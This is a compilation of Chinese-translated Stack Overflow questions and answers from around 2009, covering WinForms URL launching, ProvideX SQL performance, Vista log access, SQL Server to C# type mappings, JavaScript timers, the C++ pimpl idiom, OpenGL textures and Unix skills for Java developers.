^(资料来源：[使用 VBScript 将 SQL 输出写入 CSV](http://dev-notes.com/code.php?q=18)。)

# winforms - 从 WinForms 应用程序启动 URL

> ID：425381
> 
> 赞同：33
> 
> 时间：2009-01-08T18:49:29.490
> 
> 标签：winforms

我有一个 VB.NET WinForms 应用程序，我需要在其中将用户引至带有文档/帮助的网页。我意识到 LinkBut​​ton 会成功，但我想要的是一个标准的 Button 控件，用于在单击该按钮时启动系统默认浏览器。我能找到的唯一代码引用 Win32 API，挂钩 ShellExecute 命令：

```
ShellExecute(Me.Handle.ToInt32, "Open", "http://www.stackoverflow.com/", CStr(0), CStr(0), WindowStyle.SW_MAXIMIZE) 
```

有没有其他人知道如何以“正确和纯粹”的 .NET 方式做到这一点？

* * *

## 回答 #1

> 赞同：66
> 
> 时间：2009-01-08T18:52:06.597

```
System.Diagnostics.Process.Start("http://www.website.com"); 
```

应该管用

# sql - Providex 查询性能

> ID：425382
> 
> 赞同：3
> 
> 时间：2009-01-08T18:49:29.677
> 
> 标签：sql, database

我正在对我们在 MAS 90 中使用的 providerx 数据库运行一个查询。该查询将三个表连接在一起，并且速度很慢但并非难以忍受，每次运行大约需要 8 分钟。该查询在 where 子句中有相当数量的条件：

我将省略查询的选择部分，因为它又长又简单，只是三个表中要在结果中使用的字段列表。

但是 8 分钟运行时版本中的表和 where 子句是：

（第一个参数是用户选择日期范围的下限，第二个是上限。）

```
FROM  "AR_InvoiceHistoryDetail" "AR_InvoiceHistoryDetail", 
"AR_InvoiceHistoryHeader" "AR_InvoiceHistoryHeader", "IM1_InventoryMasterfile" 
"IM1_InventoryMasterfile" 
WHERE "AR_InvoiceHistoryDetail"."InvoiceNo" = "AR_InvoiceHistoryHeader"."InvoiceNo" 
AND "AR_InvoiceHistoryDetail"."ItemCode" = "IM1_InventoryMasterfile"."ItemNumber" 
AND "AR_InvoiceHistoryHeader"."SalespersonNo" = 'SMC' 
AND "AR_InvoiceHistoryHeader"."OrderDate" >= @p_dr 
AND "AR_InvoiceHistoryHeader"."OrderDate" <= @p_d2 
```

但是，事实证明，同一个表中的另一个日期字段需要与日期范围进行比较。因此，我将 WHERE 子句末尾的 Order Dates 更改为 InvoiceDate。我还没有成功运行查询。我已经等了40多分钟。我无法控制索引，因为这是一个 MAS 90 数据库，我不相信我可以直接更改其数据库特性。

什么可能导致性能出现如此大（至少 5 倍）的差异。是否 OrderDate 可能已被索引而 InvoiceDate 没有？我已经尝试过 BETWEEN 子句，但它似乎不适用于提供方言。我在自定义报告引擎中通过 .NET 使用 ODBC 接口。我一直在调试报告，当我要求 VS Break All 时，它正在数据库执行点运行，在 8 分钟报告等待的同一位置，所以几乎可以肯定它要么是我的查询中的某些东西，要么是数据库中的某些东西搞砸了。

如果只是 InvoiceDates 没有被索引的情况，我还能在 SQL 的 providex 方言中做些什么来优化这些查询的性能？我应该更改标准的顺序吗？此报告获取特定销售人员的结果，这就是存在 SMC 条款的原因。前面的子句用于内部连接，最后一个子句用于日期范围。

我在 OrderDate 和 InvoiceDate 版本中都使用了相同的日期范围，并且已经多次运行它们并得到了相同的结果。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-12T17:06:24.057

我仍然不知道它为什么这么慢，但是我们对来自查询的结果有另一个问题（我们切换回使用 OrderDate）。由于 IM1 表的性质，我们没有得到一些结果。

因此，一旦我弄清楚了 Providex 的语法，我就添加了一个左外连接。并且由于某种原因，即使我们还有 3 个表，它现在运行得更快了。

新的查询条件是：

```
FROM  "AR_InvoiceHistoryHeader" "AR_InvoiceHistoryHeader", 
{OJ "AR_InvoiceHistoryDetail" "AR_InvoiceHistoryDetail" 
LEFT OUTER JOIN "IM1_InventoryMasterfile" "IM1_InventoryMasterfile"
ON "AR_InvoiceHistoryDetail"."ItemCode" = 
"IM1_InventoryMasterfile"."ItemNumber" }
WHERE "AR_InvoiceHistoryDetail"."InvoiceNo" = 
"AR_InvoiceHistoryHeader"."InvoiceNo" AND 
"AR_InvoiceHistoryHeader"."SalespersonNo" = 'SMC' 
AND "AR_InvoiceHistoryHeader"."InvoiceDate" >= ? 
AND "AR_InvoiceHistoryHeader"."InvoiceDate" <= ? 
```

奇怪，但至少我在这个过程中更多地了解了Providex Sql 的世界。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-12T14:53:43.900

我以前从未使用过providex。

搜索出现了[这篇](http://www.pvx.com/support/docs/reference/PVXLanguage0029.htm)关于创建索引的语法的参考文章。

查看您的查询，有三个表和五个条件。其中两个条件是“加入条件”，三个条件是过滤条件：

```
AND "AR_InvoiceHistoryHeader"."SalespersonNo" = 'SMC'
AND "AR_InvoiceHistoryHeader"."OrderDate" >= @p_dr
AND "AR_InvoiceHistoryHeader"."OrderDate" <= @p_d2 
```

我不知道 SalespersonNo 在限制退货结果方面有多好，但在上面添加一个索引可能会很好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2011-03-28T23:28:12.130

我没有使用过 .NET，所以我的问题可能表明我的无知，但在 Access 中，如果涉及多个表，则必须使用 SQL Pass-Through 查询从 ProvideX 中提取任何结果。

# logging - 为什么我不能在 Vista 下读取存储在 C:\Windows\System32\... 中的日志而不将它们移动到另一个位置？

> ID：425388
> 
> 赞同：0
> 
> 时间：2009-01-08T18:51:00.343
> 
> 标签：logging, windows-vista

我正在使用将其日志文件存储在的程序`C:\Windows\System32\config\systemprofile\AppData\Roaming\ProgramName\*.log`，但由于某种原因，除非我将它们移动到另一个位置，否则我无法查看这些日志。

它们以适当的大小和资源管理器中的所有内容显示，但如果我尝试使用 NotePad++ 或 Tail 打开一个文件，我只会得到一个空文件，直到我将日志复制到磁盘上的另一个位置（此时所有文本都会显示美好的）。

我假设这与 Vista 安全限制有关，但我希望有一个比这更全面的解释，如果可能的话，还有一种禁用相关禁令的方法，这样我就可以在没有任何额外步骤的情况下访问文件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-08T19:40:52.177

一种*可能性*是 SysWOW64 文件重定向。

如果这是 Windows 操作系统的 64 位版本，并且您的程序（在 NotePad++ 的情况下）被编译并链接为 32 位应用程序，则操作系统将自动重定向来自 %windir%\ 的任何文件打开请求system32 到 %windir\syswow64。

出于难以解释的原因，Microsoft 认为这是最佳的兼容性方式，以便 32 位应用程序在新的 64 位操作系统下正常工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T18:57:18.660

Vista 的一项功能是限制对特定目录的访问。Google 会为您找到有关 Vista 安全性的大量信息。

# c# - SQL Server 数据类型的 C# 等效项

> ID：425389
> 
> 赞同：683
> 
> 时间：2009-01-08T18:51:08.753
> 
> 标签：c#, .net, sql-server

对于以下 SQL Server 数据类型，C# 中对应的数据类型是什么？

**精确数字**

```
bigint
numeric
bit
smallint
decimal
smallmoney
int
tinyint
money 
```

* * *

**近似数值**

```
float
real 
```

* * *

**日期和时间**

```
date
datetimeoffset
datetime2
smalldatetime
datetime
time 
```

* * *

**字符串**

```
char
varchar
text 
```

* * *

**Unicode 字符串**

```
nchar
nvarchar
ntext 
```

* * *

**二进制字符串**

```
binary
varbinary
image 
```

* * *

**其他数据类型**

```
cursor
timestamp
hierarchyid
uniqueidentifier
sql_variant
xml
table 
```

（来源：[MSDN](http://msdn.microsoft.com/en-us/library/ms187752.aspx)）

* * *

## 回答 #1

> 赞同：1236
> 
> 时间：2009-06-09T07:57:43.567

这是针对[SQL Server 2005](http://msdn.microsoft.com/en-us/library/ms131092(SQL.90).aspx)的。[SQL Server 2008](http://msdn.microsoft.com/en-us/library/ms131092%28v=sql.100%29.aspx)、[SQL Server 2008 R2](http://msdn.microsoft.com/en-us/library/ms131092%28v=sql.105%29.aspx)、[SQL Server 2012](http://msdn.microsoft.com/en-us/library/ms131092%28v=sql.110%29.aspx)和[SQL Server 2014](http://msdn.microsoft.com/en-us/library/ms131092(v=sql.120).aspx)的表有更新版本。

## SQL Server 数据类型及其 .NET Framework 等效项

下表列出了 Microsoft SQL Server 数据类型、它们在**System.Data.SqlTypes**命名空间中 SQL Server 的公共语言运行时 (CLR) 中的等效项，以及它们在 Microsoft .NET Framework 中的本机 CLR 等效项。

| SQL Server 数据类型 | CLR 数据类型 (SQL Server) | CLR 数据类型 (.NET Framework) |
| --- | --- | --- |
| 变量二进制 | SqlBytes，SqlBinary | 字节[] |
| 二进制 | SqlBytes，SqlBinary | 字节[] |
| 变量二进制（1），二进制（1） | SqlBytes，SqlBinary | 字节，字节[] |
| 图片 | 没有任何 | 没有任何 |
| varchar | 没有任何 | 没有任何 |
| 字符 | 没有任何 | 没有任何 |
| nvarchar(1)、nchar(1) | SqlChars, SqlString | 字符、字符串、字符[] |
| nvarchar | SqlChars, SqlString | 字符串，字符 [] |
| nchar | SqlChars, SqlString | 字符串，字符 [] |
| 文本 | 没有任何 | 没有任何 |
| 文本 | 没有任何 | 没有任何 |
| 唯一标识符 | SqlGuid | 指导 |
| 行版本 | 没有任何 | 字节[] |
| 少量 | SqlBoolean | 布尔值 |
| 微小的 | SqlByte | 字节 |
| 小字 | SqlInt16 | 16 |
| 整数 | SqlInt32 | 整数32 |
| 大整数 | SqlInt64 | 整数64 |
| 小钱 | SqlMoney | 十进制 |
| 钱 | SqlMoney | 十进制 |
| 数字 | SqlDecimal | 十进制 |
| 十进制 | SqlDecimal | 十进制 |
| 真实的 | SqlSingle | 单身的 |
| 漂浮 | SqlDouble | 双倍的 |
| 小日期时间 | 日期时间 | 约会时间 |
| 约会时间 | 日期时间 | 约会时间 |
| sql_variant | 没有任何 | 目的 |
| 用户自定义类型（UDT） | 没有任何 | 用户定义类型 |
| 桌子 | 没有任何 | 没有任何 |
| 光标 | 没有任何 | 没有任何 |
| 时间戳 | 没有任何 | 没有任何 |
| xml | SqlXml | 没有任何 |

* * *

## 回答 #2

> 赞同：77
> 
> 时间：2019-01-17T09:41:43.537

SQL Server 和 .Net 数据类型映射

[![SQL Server 和 .Net 数据类型映射](https://i.stack.imgur.com/CBhE9.png)](https://i.stack.imgur.com/CBhE9.png)

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2019-03-06T08:41:27.323

如果有人正在寻找从/转换为 C# 和 SQL Server 格式的方法，这里有一个简单的实现：

```
private readonly string[] SqlServerTypes = { "bigint", "binary", "bit",  "char", "date",     "datetime", "datetime2", "datetimeoffset", "decimal", "filestream", "float",  "geography",                              "geometry",                              "hierarchyid",                              "image",  "int", "money",   "nchar",  "ntext",  "numeric", "nvarchar", "real",   "rowversion", "smalldatetime", "smallint", "smallmoney", "sql_variant", "text",   "time",     "timestamp", "tinyint", "uniqueidentifier", "varbinary", "varchar", "xml" };
private readonly string[] CSharpTypes    = { "long",   "byte[]", "bool", "char", "DateTime", "DateTime", "DateTime",  "DateTimeOffset", "decimal", "byte[]",     "double", "Microsoft.SqlServer.Types.SqlGeography", "Microsoft.SqlServer.Types.SqlGeometry", "Microsoft.SqlServer.Types.SqlHierarchyId", "byte[]", "int", "decimal", "string", "string", "decimal", "string",   "Single", "byte[]",     "DateTime",      "short",    "decimal",    "object",      "string", "TimeSpan", "byte[]",    "byte",    "Guid",             "byte[]",    "string",  "string" };

public string ConvertSqlServerFormatToCSharp(string typeName)
{
    var index = Array.IndexOf(SqlServerTypes, typeName);

    return index > -1
        ? CSharpTypes[index]
        : "object";
}

public string ConvertCSharpFormatToSqlServer(string typeName)
{
    var index = Array.IndexOf(CSharpTypes, typeName);

    return index > -1
        ? SqlServerTypes[index]
        : null;
} 
```

编辑：修正错字

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2017-03-15T07:54:06.847

SQL Server 和 .NET Framework 基于不同的类型系统。例如，.NET Framework Decimal 结构的最大小数位数为 28，而 SQL Server 十进制和数字数据类型的最大小数位数为 38。单击此处的[链接](https://msdn.microsoft.com/en-us/library/cc716729(v=vs.110).aspx)！详情

[https://msdn.microsoft.com/en-us/library/cc716729(v=vs.110).aspx](https://msdn.microsoft.com/en-us/library/cc716729(v=vs.110).aspx)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2020-09-23T08:00:52.357

```
public static string FromSqlType(string sqlTypeString)
{
    if (! Enum.TryParse(sqlTypeString, out Enums.SQLType typeCode))
    {
        throw new Exception("sql type not found");
    }
    switch (typeCode)
    {
        case Enums.SQLType.varbinary:
        case Enums.SQLType.binary:
        case Enums.SQLType.filestream:
        case Enums.SQLType.image:
        case Enums.SQLType.rowversion:
        case Enums.SQLType.timestamp://?
            return "byte[]";
        case Enums.SQLType.tinyint:
            return "byte";
        case Enums.SQLType.varchar:
        case Enums.SQLType.nvarchar:
        case Enums.SQLType.nchar:
        case Enums.SQLType.text:
        case Enums.SQLType.ntext:
        case Enums.SQLType.xml:
            return "string";
        case Enums.SQLType.@char:
            return "char";
        case Enums.SQLType.bigint:
            return "long";
        case Enums.SQLType.bit:
            return "bool";
        case Enums.SQLType.smalldatetime:
        case Enums.SQLType.datetime:
        case Enums.SQLType.date:
        case Enums.SQLType.datetime2:
            return "DateTime";
        case Enums.SQLType.datetimeoffset:
            return "DateTimeOffset";
        case Enums.SQLType.@decimal:
        case Enums.SQLType.money:
        case Enums.SQLType.numeric:
        case Enums.SQLType.smallmoney:
            return "decimal";
        case Enums.SQLType.@float:
            return "double";
        case Enums.SQLType.@int:
            return "int";
        case Enums.SQLType.real:
            return "Single";
        case Enums.SQLType.smallint:
            return "short";
        case Enums.SQLType.uniqueidentifier:
            return "Guid";
        case Enums.SQLType.sql_variant:
            return "object";
        case Enums.SQLType.time:
            return "TimeSpan";
        default:
            throw new Exception("none equal type");
    }
}

public enum SQLType
{
    varbinary,//(1)
    binary,//(1)
    image,
    varchar,
    @char,
    nvarchar,//(1)
    nchar,//(1)
    text,
    ntext,
    uniqueidentifier,
    rowversion,
    bit,
    tinyint,
    smallint,
    @int,
    bigint,
    smallmoney,
    money,
    numeric,
    @decimal,
    real,
    @float,
    smalldatetime,
    datetime,
    sql_variant,
    table,
    cursor,
    timestamp,
    xml,
    date,
    datetime2,
    datetimeoffset,
    filestream,
    time,
} 
```

# javascript - 多个 setTimeout 上的 clearTimeout

> ID：425392
> 
> 赞同：6
> 
> 时间：2009-01-08T18:51:38.983
> 
> 标签：javascript, jquery

我有多个这样的 setTimeout 函数：

```
 function bigtomedium(visiblespan) {
        visiblespan.removeClass('big').addClass('medium'); 
        setTimeout(function(){ mediumtosmall(visiblespan);},150);
    };

    function mediumtosmall(visiblespan) {
        visiblespan.removeClass('medium').addClass('small');
        setTimeout(function() { smalltomedium(visiblespan); },150);
    };

    function smalltomedium(visiblespan) {
        visiblespan.removeClass('small').addClass('medium');
        setTimeout(function() { mediumtobig(visiblespan); },150);
    };

    function mediumtobig(visiblespan) {
        visiblespan.removeClass('medium').addClass('big');
        setTimeout(function() { bigtomedium(visiblespan); },150);
    }; 
```

在 jquery onclick 中激活：

```
 $('div.click').click(
        function(event) {
            var visiblespan = $('span:visible');
            mediumtosmall(visiblespan);
        }
    ); 
```

我需要做的是让点击也隐藏不可见的跨度。

```
 $('div.click').click(
        function(event) {
            var visiblespan = $('span:visible');
                            var invisiblespan = $('span:not(:visible)');
            mediumtosmall(visiblespan);
            clearTimeout(invisiblespan);
        }
    ); 
```

我不知道该怎么做是编写将停止循环的 clearTimeout 函数。任何帮助是极大的赞赏。谢谢。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-01-08T18:57:39.707

不确定您是否已经意识到这一点，但是 clearTimeout 接受之前从调用 setTimeout 返回的 timeoutID。

因此，您需要将此超时 id 分配给一个变量，该变量在您需要取消它时仍然在范围内。然后在需要停止循环时将其传递给 clearTimeout 调用。

由于它只是一个整数 id，另一种选择可能是使用“domElement.setAttribute('timoutIDFirst');”之类的东西在 dom 元素上创建自定义属性。（或 jQuery 中的 attr ），然后在需要时使用 getAttribute 检索它。

考虑到您有多个计时器，在 DOM 元素上使用自定义属性可能有助于保持整洁。

例如：

```
 function mediumtosmall(visiblespan) {
                vt.removeClass('medium').addClass('small');

                // Store the timeoutID for this timer
                var storedTimeoutID=setTimeout(function() { smalltomedium(visiblespan); },150);
                 $('span:visible').attr('timeoutID',storedTimeoutID);

        }; 
```

进而：

```
 $('div.click').click(
            function(event) {
                    var visiblespan = $('span:visible');
        var invisiblespan = $('span:visible');
                    mediumtosmall(visiblespan);

                    var storedTimeoutID=invisibleSpan.attr('timeoutID');
                    // Pass the ID to clearTimeout
                    clearTimeout(storedTimeoutID);
            }
    ); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-08T19:09:08.170

处理这个问题的最好方法可能是使用 setInterval() 而不是 setTimeout。与 setTimeout 一样，setInterval 返回一个整数，可以将其传递给 clearInterval() 以取消处理。

一个例子是（警告，我根本没有测试过这个）：

```
function animateSizes( jQueryElement ) {
  if( jQueryElement.hasClass("big") 
    jQueryElement.removeClass("big").addClass("medium");
  else if( jQueryElement.hasClass("medium") ) 
    jQueryElement.removeClass("medium").addClass("small");
  else if( jQueryElement.hasClass("small") ) 
    jQueryElement.removeClass("small").addClass("smaller");
  else
    jQueryElement.removeClass("smaller").addClass("big");
}

function startAnimation( elem ) {
  var sizeAnimation = window.setInterval( function() {animateSizes( elem )}, 150);
  elem.attr( "sizeAnimation", sizeAnimation );
}

function stopAnimation( elem ) {
  var sizeAnimation = elem.attr("sizeAnimation");
  window.clearTimeout( sizeAnimation );
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T22:20:18.487

你看过 jQuery 队列吗？我没有使用它，但它似乎是为了做你正在做的事情而设计的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-31T15:05:34.827

这是使用和清除多个超时的简单方法。它的简单技巧只是复制粘贴

```
$(document).ready(function(){
$('body').append("<div id='clear1' style='width:45px; height:25px; background-color:#999; margin-left:20px; float:left; cursor:pointer; padding:3px 0px 0px 3px;'>Stop 1</div><div id='clear2' style='width:45px; height:25px; background-color:#999; margin-left:20px; float:left; cursor:pointer; padding:3px 0px 0px 3px;'>Stop 2</div><div id='clear3' style='width:305px; height:25px; background-color:#999; margin-left:20px; float:left; cursor:pointer; padding:3px 0px 0px 3px;'>Stop 3 Timer and change massage 'Thanks'</div>");
var time1,time2,time3;
time1f();
time2f();
time3f('It is a 3st timer');
function time1f(){
    alert("It is a 1st timer");
    time1=setTimeout(time1f,4000);
}
function time2f(){
    alert("It is a 2st timer");
    time2=setTimeout(time2f,5000);
}
function time3f(str){
    alert(str);
    time3=setTimeout(time3f,6000,str);
}
function stoptimer(){
    clearTimeout(time1);
}
function stoptimer2(){
    clearTimeout(time2);
}
function stoptimer3(){
    clearTimeout(time3);
}
$('#clear1').click(function(){
    stoptimer();
});
$('#clear2').click(function(){
    stoptimer2();
});
$('#clear3').click(function(){
    stoptimer3();
    time3f('Thanks');
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-06-07T00:12:54.407

为什么不创建一个对象然后遍历该对象并清除超时？像这样：

```
// Make an object
let timeouts = {}

// Then assign them
timeouts.a = setTimeout(() => func1(), 100)
timeouts.b = setTimeout(() => func2(), 100)
timeouts.c = setTimeout(() => func3(), 100)

// To clear them all
Object.keys(timeouts).map(e => clearTimeout(timeouts[e])) 
```

# c++ - C++ DLL：不暴露整个类

> ID：425400
> 
> 赞同：0
> 
> 时间：2009-01-08T18:54:18.263
> 
> 标签：c++

我如何“隐藏”一个类的部分，以便使用该库的人不必包含我的类中使用的所有类型的标题。即采用下面的 MainWindow 类，我可以拥有它，所以当在静态/动态库中编译时，使用该库的人不必包含 windows.h，即不必定义 HWND、CRITICAL_SECTION、LRESULT 等.

我知道我可以将它分成两个类，一个只有公共接口的抽象类，以及一个隐藏的包含需要 windows.h 的成员的实现类。

这里的问题是可见类不能再自己创建，需要一个额外的创建函数（例如CreateMainWindow）。在这种情况下这很好，因为很可能只需要在堆上创建的单个实例，但对于其他类则不需要。

```
class MainWindow
{
    HWND hwnd;
    int width, height;
    std::string caption;
    bool started,exited;
    bool closeRequest;

    unsigned loopThread;
    CRITICAL_SECTION inputLock;

    Input *input;
public:
    static void init_type();
    Py::Object getattr(const char *name);

    MainWindow(int width, int height, std::string caption);
    ~MainWindow();

    bool CloseRequest(const Py::Tuple &args);
    bool CloseRequestReset(const Py::Tuple &args);

    HWND GetHwnd();

    int GetWidth();
    int GetHeight();

    Input* GetInput();
protected:
    unsigned static __stdcall loopThreadWrap(void *arg);
    unsigned LoopThreadMain();

    LRESULT WndProc(UINT msg, WPARAM wParam, LPARAM lParam);
    LRESULT static CALLBACK WndProcWrapper(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam);
}; 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-01-08T19:02:13.893

您可以使用所谓的“cheshire cat”、“letter/envelope”或“pimpl”技术隐藏类的某些部分（它们都是相同技术的不同名称）：

```
class MainWindow
{
private:
    //opaque data
    class ImplementationDetails;
    ImplementationDetails* m_data;
public:
    ... declare your public methods here ...
} 
```

最好的方法可能是您第二段中提到的抽象类（但是我​​无法理解您的最后一句话，您（尝试/失败）在其中解释了您对此的反驳）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-08T18:57:41.297

正如您在问题中提到的，使用抽象接口是您的最佳选择。您的 DLL 应该具有用于​​创建/销毁具体类实例的工厂方法。我不太明白你对这个缺点的看法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T20:46:40.983

一种或另一种方式，您有两种选择：

1.  让库用户的编译器计算出您的数据所需的内存大小 - 然后编译器可以将它放在堆栈上
2.  或者为库用户分配堆上的数据，这样用户的编译器就不需要知道数据有多大。

无论您是通过 pimpl 还是 MyAbstractObject *o = createMyObject() 公开 (2) 都没有太大不同。

第三个选项（一个骇人听闻的hack，这很有趣）在您向用户公开的对象中创建一个大字节数组，然后您使用“就地” new 在该数组中初始化您的真实对象。请不要这样做。我会去用肥皂洗我的大脑。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T18:57:26.460

这本书可能会给你一些想法：

[http://www.amazon.com/Large-Scale-Software-Addison-Wesley-Professional-Computing/dp/0201633620](https://rads.stackoverflow.com/amzn/click/com/0201633620)

大规模 C++ 软件设计

约翰·拉科斯

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-08T22:45:32.757

如前所述，您想使用 pimpl。我已经做到了，而且效果很好。它对您图书馆的用户完全透明。

# opengl - 在 OpenGL 中显示大图像的首选方式是什么

> ID：425401
> 
> 赞同：7
> 
> 时间：2009-01-08T18:54:23.067
> 
> 标签：opengl, graphics, textures

我有几次这个问题。假设我想在 OpenGL 上下文中显示闪屏或其他东西（或 DirectX，这更像是一个概念性的东西），现在，我可以只加载 2048x2048 纹理并希望显卡能够应付它（我想现在大部分都会），但是随着老式显卡的增长，我有一种糟糕的良心靠在我身上，告诉我不应该使用那么大的纹理。

现在的首选方式是什么？是把那个东西塞进视频内存，平铺，还是让 CPU 完成工作和 glDrawPixels？或者更精细的东西？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-01-08T20:28:08.260

如果这是一个没有动画的单帧初始图像，那么使用`glDrawPixels`. 如果性能至关重要并且您需要使用纹理，那么正确的方法是在运行时确定最大支持的纹理大小，使用代理纹理。

```
GLint width = 0;
while ( 0 == width ) {  /* use a better condition to prevent possible endless loop */
    glTexImage2D(GL_PROXY_TEXTURE_2D, 
                      0,                /* mip map level */
                      GL_RGBA,          /* internal format */
                      desiredWidth,     /* width of image */
                      desiredHeight,    /* height of image */
                      0,                /* texture border */
                      GL_RGBA           /* pixel data format, */ 
                      GL_UNSIGNED_BYTE, /* pixel data type */
                      NULL              /* null pointer because this a proxy texture */
    );

    /* the queried width will NOT be 0, if the texture format is supported */
    glGetTexLevelParameteriv(GL_PROXY_TEXTURE_2D, 0, GL_TEXTURE_WIDTH, &width);

    desiredWidth /= 2; desiredHeight /= 2;
} 
```

一旦您知道系统的 OpenGL 驱动程序支持的最大纹理大小，如果您的图像不适合，您至少有两个选择：

*   **图像平铺**：将图像分割成更小的支持块后使用多个四边形。像闪屏这样的图像平铺不应该太棘手。您可以使用[glPixelStorei](http://www.opengl.org/documentation/specs/man_pages/hardcopy/GL/html/gl/pixelstore.html)的`GL_PACK_ROW_LENGTH`参数将较大图像的部分加载到纹理中。
*   **图像调整大小**：调整图像大小以适应支持的最大纹理大小。甚至还有一个 GLU 辅助函数可以为您执行此操作， [gluScaleImage](http://www.opengl.org/documentation/specs/man_pages/hardcopy/GL/html/glu/scaleimage.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T20:16:19.953

我认为没有内置的 opengl 函数，但您可能会找到一个库（或自己编写函数）将图像分解成更小的块，然后打印以筛选更小的块（128x128 平铺或类似）。

我在使用[Slick2D](http://slick.cokeandcode.com/)进行 Java 游戏时遇到了问题。[你可以在这里](https://bob.newdawnsoftware.com/repos/slick/trunk/Slick/src/org/newdawn/slick/BigImage.java)查看他们的“BigImage”类的想法。

# java - 学习Java，熟悉Unix到底有多重要？

> ID：425402
> 
> 赞同：4
> 
> 时间：2009-01-08T18:54:32.613
> 
> 标签：java, unix

除了 Java 语言本身，您还必须学习 Java 框架。除了语言（C#/VB）之外，您还必须学习 .net 框架。

了解unix有多重要？或者更确切地说，应该关注哪些 unix 领域？

看到很多人在 unix 机器上运行基于 java 的应用程序（桌面/网络），**您需要什么样的 unix 技能**？我们只是在谈论基本的目录遍历、创建文件等，还是还有更多？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-01-08T20:02:51.180

从 Sun 营销材料中读到的答案是 Java 是跨平台的，所以你不知道。

实际的答案是，您需要了解足够多的知识才能在您计划使用它的平台上启动并运行您自己的应用程序。如果您从事 Web 开发工作，了解 Apache 或 Tomcat 配置会有所帮助，了解如何使用基本网络分析工具也很有帮助 -和`ifconfig`命令都很有用。文件权限工具也是使系统正常工作的必备工具 - 查看这些命令以及这些命令如何工作。`netstat``traceroute``chmod``chown`

桌面系统更容易，因为大多数窗口系统都非常擅长跨平台工作，但您仍然需要了解一点文件系统和权限的结构。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-01-08T18:58:55.663

实际上，编写基于 java 的应用程序不需要直接的 unix 技能。但是，如果您想在 unix 机器上开发基于 java 的应用程序并在那里部署，您需要对如何操作和管理 unix 机器有很好的工作理解。

但是对于您提到的领域（目录遍历、创建文件），您将使用仅偶尔涉及 Unix 特定的 Java API（“\n”与“\r\n”、以“/”为根的目录等。） 信息。当他们确实接触时，这不是您需要以编程方式了解的内容，而是您需要以用户/管理员方式了解的内容。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-08T19:27:53.013

对于它本身的语言并不重要。

你可以很好地学习java，而且根本没有接触过unix盒子。

如果您想在 unix 服务器上进行部署，那么您应该只了解基础知识。

文件路径、新行、权限等，但所需的知识可以在终端输入几个小时后获得。

大多数操作系统细节从一开始就被抽象到语言中。那些不能抽象的（比如 cron ）被抛在了后面。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-08T20:08:38.410

使用 Java 并不需要 Unix 技能，但如果您需要，您将拥有一个与任何类型的开发相关的好工具箱。我当然很欣赏用 grep 查找文件的整个源代码树、使用 Perl 进行代码生成等等的能力。即使是计算所有源代码行的简单问题，在仅 GUI 的世界中也很难做到。了解基本的 Unix 命令行工具将使您成为更好的 imo 开发人员。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-08T18:58:39.453

我认为您的比喻意味着除了语言本身之外，您还应该学习 Java 库。

当然，了解 UNIX 会有所帮助，因为它会增加您的一般知识，但我认为它与 Java 并没有真正的直接关系。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-08T18:59:51.840

除了知道如何遍历目录之外，您还需要能够编辑和 grep 文件。您还需要知道如何进行一些基本的流程管理。但是您需要的详细程度取决于您想在 unix 系统上执行的操作。例如。web 开发需要你运行一个 web 容器，比如 tomcat。您可能想学习您选择的系统的包管理器。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-08T19:10:44.827

这取决于您的操作系统。您可以在 Windows 上进行 Java 开发，在这种情况下不需要 Unix/Linux 知识。也就是说，即使在 Windows GNU/Cygwin 实用程序上也会有所帮助。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-04-30T08:21:49.680

我假设你在谈论学习而不是开发一个完整的项目。由于[JVM](http://en.wikipedia.org/wiki/Java_Virtual_Machine)应该为程序员提供统一的 API，而不管底层系统如何，Java 程序的编写方式并不特定于底层系统（直到使用[JNI](http://en.wikipedia.org/wiki/Java_Native_Interface)等） '）。

这意味着作为学习小程序的编写者，您对底层系统的了解应该是最少的。

如果您不使用 IDE，您至少应该知道如何从命令行运行 'javac'、'java' 并测试您的程序。

如果您正在使用[Eclipse](http://www.eclipse.org/)之类的IDE，那么从 IDE 运行的角度来看，您应该期望获得几乎与下面的系统隔离的体验。

但是请记住，这是愿景，并且始终建议您至少了解一下您自己的系统上正在发生的事情。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-04-30T08:43:04.153

你不需要知道 *NIX 来开发一个 Java 应用程序，也许如果你要在 *NIX 机器上运行它，或者如果它使用与 *NIX 非常相关的东西，那么如果你知道关于例如，文件名和权限。

需要了解 *NIX 需要在 *NIX 服务器上部署应用程序。如果是这种情况，最好了解系统变量（例如设置 JAVA_HOME）、*NIX 机器的典型目录结构和基本使用（创建文件、目录、删除、符号链接.. .)。

我认为了解一些脚本（bash、csh、sh）非常好。例如，根据部署的复杂性，这可以为您提供*额外的分数*。

# https - 总是重定向到 https 是否明智？

> ID：425405
> 
> 赞同：0
> 
> 时间：2009-01-08T18:55:37.743
> 
> 标签：https, apache2

